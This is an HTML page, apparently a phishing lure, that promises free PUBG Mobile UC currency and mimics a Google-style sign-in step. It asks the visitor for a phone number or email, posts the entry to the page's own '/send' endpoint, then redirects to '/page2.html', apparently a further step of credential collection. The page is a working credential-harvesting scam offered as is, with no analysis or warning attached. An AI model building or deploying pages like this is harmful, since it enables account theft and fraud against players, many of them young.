<!DOCTYPE html>
<html>
<head>
    <title>Chat</title>

    <!-- Telefon uchun muhim -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: url("https://upload.wikimedia.org/wikipedia/ru/thumb/7/7e/PlayerUnknown%27s_Battlegrounds_Mobile.jpg/960px-PlayerUnknown%27s_Battlegrounds_Mobile.jpg") no-repeat center center/cover;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .main {
            width: 900px;
            height: 500px;
            display: flex;
            padding: 40px;
        }

        .left {
            flex: 1;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
            margin-left: -20px;
        }

        .title {
            font-size: 32px;
        }

        .subtitle {
            color: #9aa0a6;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #5f6368;
            border-radius: 6px;
            background: rgba(0,0,0,0.5); /* 🔥 biroz qoraytirildi o‘qilishi uchun */
            color: white;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border: 2px solid #8ab4f8;
        }

        .bottom {
            margin-top: 30px;
            display: flex;
            justify-content: flex-end;
        }

        button {
            background: #8ab4f8;
            border: none;
            padding: 10px 25px;
            border-radius: 20px;
            cursor: pointer;
        }

        /* 📱 TELEFON UCHUN */
        @media (max-width: 768px) {
            body {
                align-items: flex-start;
                padding: 20px;
            }

            .main {
                width: 100%;
                height: auto;
                flex-direction: column;
                padding: 20px;
            }

            .left {
                margin-bottom: 30px;
            }

            .title {
                font-size: 24px;
            }

            input {
                font-size: 14px;
                padding: 14px;
            }

            .bottom {
                justify-content: center;
            }

            button {
                width: 100%;
                padding: 12px;
            }
        }
    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="logo">
            бесплатно +300 uc✅
            <img src="https://i.playerok.com/j5WEQwfdF86Ut0cSVqOFJgcoockGJ5jiEsE9nwI043c/wm:0.8:soea:5:2:0.2/rs:fill:0:1000:0/g:no/quality:99/czM6Ly9wbGF5ZXJvay8vaW1hZ2VzLzFmMDg3ZWYwLTVlMTktNmExMC1jNWE4LWQwODM1N2E1YmQzYi5qcGVn.jpg" 
                 style="width:30px; height:30px; vertical-align:middle; margin-left:5px;">
        </div>
    </div>

    <div class="right">

        <div style="margin-bottom:10px; color:#8ab4f8; font-size:14px;">
            +60 uc bonus🎁
        </div>

        <input id="msg" placeholder="Телефон или эл. почта." autocomplete="on">

        <div class="bottom">
            <button onclick="send()">Далее</button>
        </div>

    </div>
</div>

<script>
window.onload = () => {
    document.getElementById("msg").focus();
};

function send() {
    const message = document.getElementById("msg").value;

    if (!message) {
        alert("Email yoz!");
        return;
    }

    fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
    })
    .then(() => {
        window.location.href = "/page2.html";
    });
}
</script>

</body>
</html>
